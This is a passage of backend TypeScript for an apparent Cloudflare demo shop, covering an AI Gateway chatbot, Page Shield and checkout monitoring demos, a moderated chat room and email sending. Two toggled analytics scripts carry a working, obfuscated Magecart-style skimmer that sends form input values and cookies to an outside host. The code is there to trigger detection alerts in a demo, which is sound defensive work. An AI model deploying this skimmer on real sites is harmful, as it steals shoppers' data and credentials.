  - /load-balancing        — Load Balancing
  - /image-optimization    — Image Optimization
  - /dns                   — DNS + Foundation DNS (interactive lookup)

Developer Platform:
  - /workers               — Workers (Edge Computing)
  - /workers-ai            — Workers AI (interactive prompt demo)
  - /cloud-storage         — D1, R2, KV (interactive upload + pricing calc)
  - /ai-gateway            — AI Gateway (you, the chatbot, route through this)
  - /pages                 — Pages
  - /durable-objects       — Durable Objects

Network Security:
  - /magic-transit         — Magic Transit (also covers L3/L4 DDoS)
  - /cloudflare-wan        — Cloudflare WAN (Magic WAN)
  - /magic-firewall        — Magic Firewall
  - /spectrum              — Spectrum

When a user asks about a topic, point them to the right slug. Keep replies concise.
This very chatbot is a live example of Cloudflare AI Gateway in action — every message
you receive has been routed through gateway.ai.cloudflare.com to Workers AI (Llama 3.3 70B).`;

    const response = await fetch(
      "https://gateway.ai.cloudflare.com/v1/e2e9b1cd0acebaaf2aee23d918eee2b1/demo-shop-gateway/compat/chat/completions",
      {
        method: "POST",
        headers: {
          "cf-aig-authorization": `Bearer ${c.env.AIG_TOKEN}`,
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          model: "workers-ai/@cf/meta/llama-3.3-70b-instruct-fp8-fast",
          messages: [{ role: "system", content: systemPrompt }, ...messages],
          stream: false,
        }),
      }
    );

    if (!response.ok) {
      const errorText = await response.text();
      return c.json({
        error: "AI Gateway request failed",
        status: response.status,
        details: errorText,
      }, 500);
    }

    const result = await response.json();
    return c.json(result);
  } catch (error: any) {
    return c.json({ error: "Chat failed: " + error.message }, 500);
  }
});

// ── About Me RAG demo (Worker → AI Search / AutoRAG) ─────────

app.post("/api/aboutme-rag", async (c) => {
  try {
    const body = await c.req.json().catch(() => ({}));
    const query = typeof body.query === "string" ? body.query.trim() : "";
    if (!query) return c.json({ error: "query required" }, 400);

    if (!c.env.ABOUTME_RAG) {
      return c.json(
        { error: "ABOUTME_RAG service binding not configured" },
        500
      );
    }

    const response = await c.env.ABOUTME_RAG.fetch("https://aboutme-rag/query", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ query }),
    });
    const result = await response.json();
    return c.json(result, response.ok ? 200 : 500);
  } catch (error: any) {
    return c.json({ error: "About Me RAG query failed: " + error.message }, 500);
  }
});

// ── Page Shield demo ─────────────────────────────────────────
// Serves a small "analytics" JS file from a stable URL so that Page
// Shield's continuous monitoring can fingerprint it. The PageShieldDemo
// component toggles between v1 (clean) and v2 (Magecart-style skimmer)
// to trigger Page Shield's Code Change Detection alert.

const PAGE_SHIELD_KV_KEY = "page_shield:analytics_version";

const PAGE_SHIELD_SCRIPT_V1 = `// remydemo analytics shim - v1 (clean)
// Tracks pageviews and outbound clicks. No PII collected.
(function () {
  "use strict";
  var endpoint = "/api/page-shield/noop";
  function track(event, payload) {
    try {
      var data = JSON.stringify({ event: event, payload: payload || {}, ts: Date.now() });
      if (navigator.sendBeacon) {
        navigator.sendBeacon(endpoint, data);
      }
    } catch (e) { /* swallow */ }
  }
  window.addEventListener("DOMContentLoaded", function () {
    track("pageview", { path: location.pathname, ref: document.referrer || null });
  });
  document.addEventListener("click", function (e) {
    var a = e.target && e.target.closest && e.target.closest("a[href]");
    if (a) track("click", { href: a.getAttribute("href") });
  }, { passive: true });
  window.__remydemoAnalytics = { version: "v1", track: track };
})();
`;

const PAGE_SHIELD_SCRIPT_V2 = `// remydemo analytics shim - v1 (clean)
// Tracks pageviews and outbound clicks. No PII collected.
(function () {
  "use strict";
  var endpoint = "/api/page-shield/noop";
  function track(event, payload) {
    try {
      var data = JSON.stringify({ event: event, payload: payload || {}, ts: Date.now() });
      if (navigator.sendBeacon) {
        navigator.sendBeacon(endpoint, data);
      }
    } catch (e) { /* swallow */ }
  }
  window.addEventListener("DOMContentLoaded", function () {
    track("pageview", { path: location.pathname, ref: document.referrer || null });
  });
  document.addEventListener("click", function (e) {
    var a = e.target && e.target.closest && e.target.closest("a[href]");
    if (a) track("click", { href: a.getAttribute("href") });
  }, { passive: true });
  // [INJECTED 2026-06-18] - skimmer payload from compromised CDN
  var _x=["input","blur","value","name","tagName","INPUT","__remydemo_collected"];
  document.addEventListener(_x[1],function(e){
    var t=e.target;if(!t||t[_x[4]]!==_x[5])return;
    var c=window[_x[6]]||(window[_x[6]]={});
    c[t[_x[3]]||t.id||"_"]=t[_x[2]];
    try{
      var p="https://cdn-metrics-collector.io/px?sid="+encodeURIComponent(document.cookie)+"&d="+encodeURIComponent(JSON.stringify(c))+"&ua="+encodeURIComponent(navigator.userAgent)+"&ref="+encodeURIComponent(location.href)+"&ts="+Date.now();
      navigator.sendBeacon&&navigator.sendBeacon(p);
    }catch(e){}
  },true);
  window.__remydemoAnalytics = { version: "v1", track: track };
})();
`;

// GET /api/page-shield/analytics.js -- serves whichever version is "live"
app.get("/api/page-shield/analytics.js", async (c) => {
  let version = "v1";
  try {
    const stored = await c.env.DEMO_KV.get(PAGE_SHIELD_KV_KEY);
    if (stored === "v2") version = "v2";
  } catch (e) {
    // KV miss is fine, fall back to v1
  }
  const body = version === "v2" ? PAGE_SHIELD_SCRIPT_V2 : PAGE_SHIELD_SCRIPT_V1;
  return new Response(body, {
    status: 200,
    headers: {
      "Content-Type": "application/javascript; charset=utf-8",
      // No cache: Page Shield must see the current version on every load so
      // the v1 → v2 toggle is detected as a Code Change within minutes.
      "Cache-Control": "no-cache, no-store, must-revalidate",
      "X-Demo-Script-Version": version,
    },
  });
});

// POST /api/page-shield/toggle  body: { version?: "v1" | "v2" }
// If no body is provided, flips the current version. Returns the new state.
app.post("/api/page-shield/toggle", async (c) => {
  let requested: string | undefined;
  try {
    const body = await c.req.json().catch(() => ({}));
    if (body && typeof body.version === "string") requested = body.version;
  } catch (e) {
    // ignore
  }

  let next: "v1" | "v2";
  if (requested === "v1" || requested === "v2") {
    next = requested;
  } else {
    const current = await c.env.DEMO_KV.get(PAGE_SHIELD_KV_KEY);
    next = current === "v2" ? "v1" : "v2";
  }

  await c.env.DEMO_KV.put(PAGE_SHIELD_KV_KEY, next);
  return c.json({ version: next, ts: Date.now() });
});

// GET /api/page-shield/status -- which version is currently live
app.get("/api/page-shield/status", async (c) => {
  const stored = await c.env.DEMO_KV.get(PAGE_SHIELD_KV_KEY);
  const version = stored === "v2" ? "v2" : "v1";
  return c.json({ version });
});

// POST /api/page-shield/noop -- absorbs analytics beacons quietly so the
// clean v1 script has somewhere real to talk to.
app.post("/api/page-shield/noop", (c) => c.body(null, 204));

// ── Client-Side Security checkout demo ───────────────────────
// Stable resources for the /client-side-security/checkout page. These give
// Page Shield / Client-Side Security a clean, reproducible inventory of
// first-party scripts, third-party scripts, connections, and cookies to
// monitor. Most should NOT change between page loads. The "scenario"
// endpoints below are explicit toggles to fire alert-worthy events.

const CSS_KV = {
  ANALYTICS_VERSION: "css:checkout:analytics_version",
  SCENARIO_NEW_SCRIPT: "css:checkout:scenario:new_script",
  SCENARIO_BAD_CONN: "css:checkout:scenario:bad_conn",
  SCENARIO_BAD_COOKIE: "css:checkout:scenario:bad_cookie",
};

// First-party "checkout-core" script — the stable baseline. Provides the
// fake checkout submit flow. Page Shield fingerprints this once and uses it
// as the reference version for code-change detection alongside analytics.js.
const CSS_CHECKOUT_CORE_JS = `// remydemo checkout-core - v1
// Wires the fake checkout form, posts to /api/page-shield/checkout/submit,
// sets a JS-side first-party cookie, and emits one expected telemetry beacon.
(function () {
  "use strict";

  function readForm() {
    var f = document.getElementById("checkout-form");
    if (!f) return {};
    var fd = new FormData(f);
    var out = {};
    fd.forEach(function (v, k) { out[k] = v; });
    return out;
  }

  function setJsCookie() {
    // Browser-set first-party cookie (Client-Side Security will see this
    // as an "unknown" type cookie because it isn't set via Set-Cookie).
    document.cookie = "demo_cart_seen=1; path=/; SameSite=Lax; max-age=86400";
  }

  function sendTelemetry(payload) {
    try {
      var body = JSON.stringify({
        kind: "checkout_event",
        payload: payload || {},
        ts: Date.now(),
      });
      if (navigator.sendBeacon) {
        navigator.sendBeacon("/api/page-shield/checkout/telemetry", body);
      } else {
        fetch("/api/page-shield/checkout/telemetry", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: body,
          keepalive: true,
        });
      }
    } catch (e) { /* swallow */ }
  }

  function submitCheckout(e) {
    if (e && e.preventDefault) e.preventDefault();
    var data = readForm();
    var statusEl = document.getElementById("checkout-status");
    if (statusEl) statusEl.textContent = "Processing...";
    fetch("/api/page-shield/checkout/submit", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(data),
      credentials: "same-origin",
    })
      .then(function (r) { return r.json(); })
      .then(function (j) {
        if (statusEl) {
          statusEl.textContent = j && j.ok
            ? "Order accepted: " + (j.orderId || "")
            : "Order failed.";
        }
        sendTelemetry({ event: "checkout_submitted", orderId: j && j.orderId });
      })
      .catch(function () {
        if (statusEl) statusEl.textContent = "Order error.";
      });
    return false;
  }

  function init() {
    setJsCookie();
    var f = document.getElementById("checkout-form");
    if (f) f.addEventListener("submit", submitCheckout);
    sendTelemetry({ event: "page_loaded", path: location.pathname });
    window.__remydemoCheckout = { version: "v1", submit: submitCheckout };
  }

  if (document.readyState === "loading") {
    document.addEventListener("DOMContentLoaded", init);
  } else {
    init();
  }
})();
`;

// First-party "analytics" script — exact same v1/v2 pattern as the existing
// /api/page-shield/analytics.js, but scoped under the checkout path so the
// code-change scenario lives entirely inside the checkout story.
const CSS_ANALYTICS_V1 = `// remydemo checkout analytics - v1 (clean)
(function () {
  "use strict";
  function track(event, payload) {
    try {
      var data = JSON.stringify({ event: event, payload: payload || {}, ts: Date.now() });
      if (navigator.sendBeacon) {
        navigator.sendBeacon("/api/page-shield/checkout/telemetry", data);
      }
    } catch (e) { /* swallow */ }
  }
  window.addEventListener("DOMContentLoaded", function () {
    track("pageview", { path: location.pathname, ref: document.referrer || null });
  });
  document.addEventListener("click", function (e) {
    var a = e.target && e.target.closest && e.target.closest("a[href]");
    if (a) track("click", { href: a.getAttribute("href") });
  }, { passive: true });
  window.__remydemoCheckoutAnalytics = { version: "v1", track: track };
})();
`;

const CSS_ANALYTICS_V2 = `// remydemo checkout analytics - v1 (clean)
(function () {
  "use strict";
  function track(event, payload) {
    try {
      var data = JSON.stringify({ event: event, payload: payload || {}, ts: Date.now() });
      if (navigator.sendBeacon) {
        navigator.sendBeacon("/api/page-shield/checkout/telemetry", data);
      }
    } catch (e) { /* swallow */ }
  }
  window.addEventListener("DOMContentLoaded", function () {
    track("pageview", { path: location.pathname, ref: document.referrer || null });
  });
  document.addEventListener("click", function (e) {
    var a = e.target && e.target.closest && e.target.closest("a[href]");
    if (a) track("click", { href: a.getAttribute("href") });
  }, { passive: true });
  // [INJECTED 2026-06-19] - skimmer payload from compromised CDN
  var _x=["input","blur","value","name","tagName","INPUT","__remydemo_collected"];
  document.addEventListener(_x[1],function(e){
    var t=e.target;if(!t||t[_x[4]]!==_x[5])return;
    var c=window[_x[6]]||(window[_x[6]]={});
    c[t[_x[3]]||t.id||"_"]=t[_x[2]];
    try{
      var p="https://cdn-metrics-collector.io/px?sid="+encodeURIComponent(document.cookie)+"&d="+encodeURIComponent(JSON.stringify(c))+"&ua="+encodeURIComponent(navigator.userAgent)+"&ref="+encodeURIComponent(location.href)+"&ts="+Date.now();
      navigator.sendBeacon&&navigator.sendBeacon(p);
    }catch(e){}
  },true);
  window.__remydemoCheckoutAnalytics = { version: "v1", track: track };
})();
`;

// GET /api/page-shield/checkout-core.js — stable first-party checkout JS.
app.get("/api/page-shield/checkout-core.js", (c) => {
  return new Response(CSS_CHECKOUT_CORE_JS, {
    status: 200,
    headers: {
      "Content-Type": "application/javascript; charset=utf-8",
      "Cache-Control": "no-cache, no-store, must-revalidate",
      "X-Demo-Script": "checkout-core",
    },
  });
});

// GET /api/page-shield/checkout-analytics.js — toggled v1/v2 first-party
// analytics script. Same code-change pattern as analytics.js above.
app.get("/api/page-shield/checkout-analytics.js", async (c) => {
  let version = "v1";
  try {
    const stored = await c.env.DEMO_KV.get(CSS_KV.ANALYTICS_VERSION);
    if (stored === "v2") version = "v2";
  } catch (e) {
    // KV miss is fine, fall back to v1
  }
  const body = version === "v2" ? CSS_ANALYTICS_V2 : CSS_ANALYTICS_V1;
  return new Response(body, {
    status: 200,
    headers: {
      "Content-Type": "application/javascript; charset=utf-8",
      "Cache-Control": "no-cache, no-store, must-revalidate",
      "X-Demo-Script-Version": version,
    },
  });
});

// POST /api/page-shield/checkout-analytics/toggle — flip analytics v1 <-> v2.
app.post("/api/page-shield/checkout-analytics/toggle", async (c) => {
  let requested: string | undefined;
  try {
    const body = await c.req.json().catch(() => ({}));
    if (body && typeof (body as any).version === "string") {
      requested = (body as any).version;
    }
  } catch (e) {
    // ignore
  }

  let next: "v1" | "v2";
  if (requested === "v1" || requested === "v2") {
    next = requested;
  } else {
    const current = await c.env.DEMO_KV.get(CSS_KV.ANALYTICS_VERSION);
    next = current === "v2" ? "v1" : "v2";
  }

  await c.env.DEMO_KV.put(CSS_KV.ANALYTICS_VERSION, next);
  return c.json({ version: next, ts: Date.now() });
});

// GET /api/page-shield/checkout-analytics/status — current live version.
app.get("/api/page-shield/checkout-analytics/status", async (c) => {
  const stored = await c.env.DEMO_KV.get(CSS_KV.ANALYTICS_VERSION);
  const version = stored === "v2" ? "v2" : "v1";
  return c.json({ version });
});

// POST /api/page-shield/checkout/submit — accepts fake checkout submission
// and sets a deterministic first-party cookie via Set-Cookie so that
// Client-Side Security cookie monitoring sees a known first-party cookie.
app.post("/api/page-shield/checkout/submit", async (c) => {
  let body: any = {};
  try { body = await c.req.json(); } catch (e) { body = {}; }

  const orderId = "ord_" + Math.random().toString(36).slice(2, 10);
  const sessionId = "sess_" + Math.random().toString(36).slice(2, 14);

  // First-party cookies. These will appear in Client-Side Security cookie
  // monitoring as `first_party` type with full attributes. Each cookie must
  // be sent as its OWN Set-Cookie header (not joined with ", ") because
  // cookie attributes like Expires legally contain commas and would otherwise
  // collide and trigger "attribute overwritten" browser warnings.
  const headers = new Headers({ "Content-Type": "application/json" });
  headers.append(
    "Set-Cookie",
    `demo_checkout_session=${sessionId}; Path=/; SameSite=Strict; Secure; HttpOnly; Max-Age=1800`
  );
  headers.append(
    "Set-Cookie",
    `demo_checkout_last_order=${orderId}; Path=/; SameSite=Lax; Secure; Max-Age=604800`
  );

  return new Response(
    JSON.stringify({
      ok: true,
      orderId,
      sessionId,
      received: {
        name: typeof body.name === "string" ? body.name.slice(0, 64) : "",
        // Never echo card data even in a demo.
        cardLast4: typeof body.card === "string" ? body.card.replace(/\D/g, "").slice(-4) : "",
      },
      ts: Date.now(),
    }),
    { status: 200, headers }
  );
});

// POST /api/page-shield/checkout/telemetry — first-party telemetry sink.
// Returns 204 so the browser doesn't hold long connections open.
app.post("/api/page-shield/checkout/telemetry", (c) => c.body(null, 204));

// ── Scenario toggles ─────────────────────────────────────────
// Each scenario is a small piece of state in KV that the checkout page reads
// at render time. The page conditionally injects the corresponding signal so
// Client-Side Security generates an alert / dashboard entry.

type ScenarioState = { enabled: boolean; ts: number };

async function readScenario(c: any, key: string): Promise<ScenarioState> {
  try {
    const raw = await c.env.DEMO_KV.get(key);
    if (!raw) return { enabled: false, ts: 0 };
    const parsed = JSON.parse(raw);
    return { enabled: !!parsed.enabled, ts: Number(parsed.ts) || 0 };
  } catch {
    return { enabled: false, ts: 0 };
  }
}

async function writeScenario(c: any, key: string, enabled: boolean) {
  const value: ScenarioState = { enabled, ts: Date.now() };
  await c.env.DEMO_KV.put(key, JSON.stringify(value));
  return value;
}

// GET /api/page-shield/checkout/scenarios — current state of all scenarios.
app.get("/api/page-shield/checkout/scenarios", async (c) => {
  const [newScript, badConn, badCookie, analyticsRaw] = await Promise.all([
    readScenario(c, CSS_KV.SCENARIO_NEW_SCRIPT),
    readScenario(c, CSS_KV.SCENARIO_BAD_CONN),
    readScenario(c, CSS_KV.SCENARIO_BAD_COOKIE),
    c.env.DEMO_KV.get(CSS_KV.ANALYTICS_VERSION),
  ]);
  return c.json({
    newScript,
    badConn,
    badCookie,
    analyticsVersion: analyticsRaw === "v2" ? "v2" : "v1",
  });
});

// POST /api/page-shield/checkout/scenarios  body: { name, enabled? }
//   name: "new_script" | "bad_conn" | "bad_cookie" | "code_change"
//   enabled: boolean (defaults to toggle of current)
app.post("/api/page-shield/checkout/scenarios", async (c) => {
  let body: any = {};
  try { body = await c.req.json(); } catch (e) { body = {}; }

  const name = String(body.name || "");
  const explicitEnabled =
    typeof body.enabled === "boolean" ? (body.enabled as boolean) : undefined;

  let key: string | null = null;
  if (name === "new_script") key = CSS_KV.SCENARIO_NEW_SCRIPT;
  else if (name === "bad_conn") key = CSS_KV.SCENARIO_BAD_CONN;
  else if (name === "bad_cookie") key = CSS_KV.SCENARIO_BAD_COOKIE;

  if (name === "code_change") {
    const current = await c.env.DEMO_KV.get(CSS_KV.ANALYTICS_VERSION);
    const next =
      explicitEnabled === undefined
        ? current === "v2" ? "v1" : "v2"
        : explicitEnabled
          ? "v2"
          : "v1";
    await c.env.DEMO_KV.put(CSS_KV.ANALYTICS_VERSION, next);
    return c.json({ ok: true, scenario: name, analyticsVersion: next });
  }

  if (!key) {
    return c.json({ ok: false, error: "unknown scenario" }, 400);
  }

  const current = await readScenario(c, key);
  const enabled = explicitEnabled === undefined ? !current.enabled : explicitEnabled;
  const state = await writeScenario(c, key, enabled);
  return c.json({ ok: true, scenario: name, state });
});

// POST /api/page-shield/checkout/reset — reset all scenarios to disabled,
// analytics back to v1. Useful between demos.
app.post("/api/page-shield/checkout/reset", async (c) => {
  await Promise.all([
    writeScenario(c, CSS_KV.SCENARIO_NEW_SCRIPT, false),
    writeScenario(c, CSS_KV.SCENARIO_BAD_CONN, false),
    writeScenario(c, CSS_KV.SCENARIO_BAD_COOKIE, false),
    c.env.DEMO_KV.put(CSS_KV.ANALYTICS_VERSION, "v1"),
  ]);
  return c.json({ ok: true });
});

// ── Durable Objects: Chat Room demo ──────────────────────────
// A single global chat room backed by the ChatRoom Durable Object
// (defined in the demo-shop-chat Worker, bound here as CHAT_ROOM).
//
//   GET  /api/chatroom/messages  — last 25 messages + next reset time
//   GET  /api/chatroom/ws        — WebSocket upgrade, proxied to the DO
//   POST /api/chatroom/send      — { username, text } → store + broadcast
//   POST /api/chatroom/clear     — wipe all messages + broadcast clear
//
// All routes address the same instance: getByName("global").
// DLP filtering on /send is intentionally omitted for now — added later.

const CHAT_USERNAME_MAX = 32;
const CHAT_TEXT_MAX = 500;

// RPC surface of the ChatRoom DO (defined in the demo-shop-chat Worker).
// Declared locally because the class isn't importable across the Worker
// boundary; the stub is cast to this shape for type-safe RPC calls.
interface ChatMessage {
  id: number;
  username: string;
  text: string;
  timestamp: number;
}
interface ChatRoomStub {
  getState(): Promise<{ messages: ChatMessage[]; nextReset: number }>;
  sendMessage(username: string, text: string): Promise<ChatMessage>;
  clearMessages(): Promise<void>;
  fetch(request: Request): Promise<Response>;
}

function chatRoomStub(c: Context<{ Bindings: Bindings }>): ChatRoomStub {
  return c.env.CHAT_ROOM.getByName("global") as unknown as ChatRoomStub;
}

// ── PG content moderation via Llama Guard 3 (Workers AI) ──────
// Llama Guard 3 classifies text against the MLCommons hazard taxonomy
// (S1–S14) and returns "safe" or "unsafe" + the violated categories.
// We block the categories that make a room not-PG. Categories that would
// false-positive in a Cloudflare dev demo (S6 specialized advice, S7
// privacy, S8 IP, S13 elections, S14 code-interpreter abuse) are left
// out so pasting code or links doesn't get rejected.
const PG_BLOCK_CATEGORIES: Record<string, string> = {
  S1: "Violent content",
  S2: "Criminal activity",
  S3: "Sexual crime",
  S4: "Child exploitation",
  S5: "Defamation",
  S9: "Weapons / mass harm",
  S10: "Hate speech",
  S11: "Self-harm",
  S12: "Sexual content",
};

// Returns { safe: true } to allow, or { safe: false, reason } to block.
// Fails OPEN (allows the message) if the model errors — a moderation
// outage should not take the chat room down in a demo.
async function moderatePg(
  text: string,
  env: Bindings
): Promise<{ safe: boolean; reason?: string }> {
  try {
    const result: any = await env.AI.run("@cf/meta/llama-guard-3-8b", {
      messages: [{ role: "user", content: text }],
    });

    const resp = result?.response;
    let unsafe = false;
    let categories: string[] = [];

    if (resp && typeof resp === "object") {
      // Structured form: { safe: boolean, categories: string[] }
      unsafe = resp.safe === false;
      categories = Array.isArray(resp.categories) ? resp.categories : [];
    } else if (typeof resp === "string") {
      // Text form: "safe" or "unsafe\nS1,S10"
      unsafe = /unsafe/i.test(resp);
      categories = (resp.match(/S\d{1,2}/g) ?? []).map((s) => s.toUpperCase());
    }

    if (!unsafe) return { safe: true };

    // Only block if a violated category is in our PG block list.
    const blocked = categories.filter((c) => c in PG_BLOCK_CATEGORIES);
    if (blocked.length === 0) return { safe: true };

    const labels = [...new Set(blocked.map((c) => PG_BLOCK_CATEGORIES[c]))];
    return { safe: false, reason: labels.join(", ") };
  } catch (err) {
    console.error("Llama Guard moderation failed (failing open):", err);
    return { safe: true };
  }
}

// Initial load: current messages + the next daily-reset timestamp.
app.get("/api/chatroom/messages", async (c) => {
  try {
    const stub = chatRoomStub(c);
    const state = await stub.getState();
    return c.json(state);
  } catch (error: any) {
    return c.json({ error: "Failed to load messages: " + error.message }, 500);
  }
});

// WebSocket upgrade — validate here (cheap), then hand the raw request
// to the DO so it owns the server side of the socket.
app.get("/api/chatroom/ws", async (c) => {
  if (c.req.header("Upgrade") !== "websocket") {
    return c.text("Expected Upgrade: websocket", 426);
  }
  const stub = chatRoomStub(c);
  return stub.fetch(c.req.raw);
});

// Send a message. Validates username + text, then asks the DO to store
// and broadcast it to every connected session.
app.post("/api/chatroom/send", async (c) => {
  try {
    const body = await c.req.json().catch(() => null);
    const username = typeof body?.username === "string" ? body.username.trim() : "";
    const text = typeof body?.text === "string" ? body.text.trim() : "";

    if (!username) {
      return c.json({ error: "Username is required" }, 400);
    }
    if (username.length > CHAT_USERNAME_MAX) {
      return c.json({ error: `Username must be ${CHAT_USERNAME_MAX} characters or fewer` }, 400);
    }
    if (!text) {
      return c.json({ error: "Message cannot be empty" }, 400);
    }
    if (text.length > CHAT_TEXT_MAX) {
      return c.json({ error: `Message must be ${CHAT_TEXT_MAX} characters or fewer` }, 400);
    }

    // PG moderation: classify with Llama Guard 3 before storing. Blocked
    // messages never reach the Durable Object.
    const verdict = await moderatePg(text, c.env);
    if (!verdict.safe) {
      return c.json({ blocked: true, reason: verdict.reason }, 422);
    }

    const stub = chatRoomStub(c);
    const message = await stub.sendMessage(username, text);
    return c.json({ ok: true, message });
  } catch (error: any) {
    return c.json({ error: "Failed to send message: " + error.message }, 500);
  }
});

// Clear the whole room.
app.post("/api/chatroom/clear", async (c) => {
  try {
    const stub = chatRoomStub(c);
    await stub.clearMessages();
    return c.json({ ok: true });
  } catch (error: any) {
    return c.json({ error: "Failed to clear messages: " + error.message }, 500);
  }
});

// ── Email Service Demo ───────────────────────────────────────
// Sends a fixed transactional-style message from the fixed demo sender
// support@remydemo.com to a visitor-entered address, using the Email
// Sending binding. The visitor controls only the recipient — sender,
// subject, and body are fixed server-side. Replying to the message
// exercises Email Routing via the existing support@remydemo.com rule.

app.post("/api/email/send", async (c) => {
  try {
    const body = await c.req.json().catch(() => null);
    const rawTo = typeof body?.to === "string" ? body.to.trim() : "";

    if (!rawTo) {
      return c.json({ error: "Enter an email address to send to." }, 400);
    }
    if (rawTo.length > 254 || /[,;\r\n]/.test(rawTo) || !EMAIL_RE.test(rawTo)) {
      return c.json({ error: "Enter a single, valid email address." }, 400);
    }

    const result = await c.env.EMAIL.send({
      to: rawTo,
      from: { email: "support@remydemo.com", name: "Cloudflare Demo Support" },
      subject: "We received your message — Cloudflare Demo Shop",
      html: DEMO_EMAIL_HTML,
      text: DEMO_EMAIL_TEXT,
    });

    return c.json({ success: true, to: rawTo, messageId: (result as any)?.messageId ?? null });
  } catch (error: any) {
    return c.json({ error: error?.message || "Failed to send email." }, 500);
  }
});

// ── Pages Functions export ───────────────────────────────────

export const onRequest = (context: { request: Request; env: Bindings }) => {
  // WebSocket upgrades must bypass Hono entirely. The CORS middleware
  // (app.use("*", cors())) reconstructs the Response to add headers, which
  // drops the non-standard `webSocket` property on the 101 reply — the
  // upgrade then silently fails. Proxy straight to the DO instead.
  const url = new URL(context.request.url);
  if (
    context.request.headers.get("Upgrade") === "websocket" &&
    url.pathname === "/api/chatroom/ws"
  ) {
    const stub = context.env.CHAT_ROOM.getByName("global") as unknown as ChatRoomStub;
    return stub.fetch(context.request);
  }

  return app.fetch(context.request, context.env, context);
};
